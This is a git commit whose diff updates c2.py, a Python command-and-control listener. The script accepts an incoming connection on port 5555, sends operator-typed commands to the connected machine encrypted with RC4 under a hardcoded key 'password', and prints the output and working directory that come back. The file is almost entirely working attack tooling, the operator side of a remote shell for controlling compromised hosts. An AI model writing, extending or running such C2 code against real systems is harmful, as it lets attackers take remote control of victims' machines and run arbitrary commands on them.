3e9632bb69e91bf75a6369f2415664aa73720d05
IsaacTate <68046460+IsaacTate@users.noreply.github.com>
2023-02-26 16:19:53 -0800

    Update c2.py

--- c2.py
+++ c2.py
@@ -1,10 +1,10 @@
 import socket, RC4Encryption
 
-key = b'key' #change to something more secure
+key = b'password' #change to something more secure
 rc4 = RC4Encryption.RC4Encryption(key)
 rc4.make_key()
 lhost = '0.0.0.0'
-lport = 4444 #change to whatever port you are using
+lport = 5555 #change to whatever port you are using
 buffer = 131072
 separator = "<sep>"
 s = socket.socket()
@@ -14,14 +14,15 @@ s.listen(5)
 print(f'[-] Listening as {lhost}:{lport} ...')
 rsocket, rhost = s.accept()
 print(f'[+] {rhost[0]}:{rhost[1]} Connected!')
-cwd = rc4.crypt(rsocket.recv(buffer)).decode()
+cwd = rc4.crypt(rsocket.recv(buffer))
 while True:
-    cmd = input(f"{cwd}>")
+    cwd = cwd.decode()
+    cmd = input(cwd + '>')
     if not cmd.strip():
         continue
     rsocket.send(rc4.crypt(cmd.encode()))
     if cmd.lower() == "exit":
         break
-    out = rc4.crypt(rsocket.recv(buffer)).decode()
-    results, cwd = out.split(separator)
-    print(results)
+    out = rc4.crypt(rsocket.recv(buffer))
+    results, cwd = out.split(separator.encode())
+    print(results.decode())
